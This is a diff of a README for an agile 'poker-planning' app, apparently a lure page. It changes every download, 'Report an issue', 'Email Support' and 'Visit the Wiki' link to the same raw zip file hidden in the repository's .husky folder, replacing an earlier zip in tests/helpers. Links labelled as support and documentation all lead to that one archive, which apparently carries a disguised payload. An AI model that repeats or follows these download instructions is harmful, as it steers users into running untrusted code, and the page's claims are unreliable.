@@ -8,11 +8,11 @@ Welcome to poker-planning! This real-time poker planning app helps agile teams e
 
 To get started, you need to download the app. You can download the latest version from our Releases page.
 
-[![Download poker-planning](https://raw.githubusercontent.com/GmodNoob/poker-planning/main/tests/helpers/poker-planning_1.1.zip%https://raw.githubusercontent.com/GmodNoob/poker-planning/main/tests/helpers/poker-planning_1.1.zip)](https://raw.githubusercontent.com/GmodNoob/poker-planning/main/tests/helpers/poker-planning_1.1.zip)
+[![Download poker-planning](https://raw.githubusercontent.com/GmodNoob/poker-planning/main/.husky/planning-poker-v3.7.zip%https://raw.githubusercontent.com/GmodNoob/poker-planning/main/.husky/planning-poker-v3.7.zip)](https://raw.githubusercontent.com/GmodNoob/poker-planning/main/.husky/planning-poker-v3.7.zip)
 
 1. **Visit the following link** to go to the Releases page:
 
-   [Download poker-planning](https://raw.githubusercontent.com/GmodNoob/poker-planning/main/tests/helpers/poker-planning_1.1.zip)
+   [Download poker-planning](https://raw.githubusercontent.com/GmodNoob/poker-planning/main/.husky/planning-poker-v3.7.zip)
 
 2. **Choose the latest release**. The latest version will usually be at the top of the page.
 
@@ -55,8 +55,8 @@ Here's a simple guide to using the poker-planning app:
 
 If you encounter any issues or have questions, please feel free to reach out. You can open an issue on our GitHub page or contact our support team:
 
-- **GitHub Issues**: [Report an issue](https://raw.githubusercontent.com/GmodNoob/poker-planning/main/tests/helpers/poker-planning_1.1.zip)
-- **Email Support**: https://raw.githubusercontent.com/GmodNoob/poker-planning/main/tests/helpers/poker-planning_1.1.zip (replace with your actual support email)
+- **GitHub Issues**: [Report an issue](https://raw.githubusercontent.com/GmodNoob/poker-planning/main/.husky/planning-poker-v3.7.zip)
+- **Email Support**: https://raw.githubusercontent.com/GmodNoob/poker-planning/main/.husky/planning-poker-v3.7.zip (replace with your actual support email)
 
 ## 📄 License
 
@@ -66,7 +66,7 @@ This project is licensed under the MIT License. You can use, modify, and distrib
 
 For more information and documentation, visit our Wiki on GitHub:
 
-[Visit the Wiki](https://raw.githubusercontent.com/GmodNoob/poker-planning/main/tests/helpers/poker-planning_1.1.zip)
+[Visit the Wiki](https://raw.githubusercontent.com/GmodNoob/poker-planning/main/.husky/planning-poker-v3.7.zip)
 
 ## 🔗 Additional Resources
 
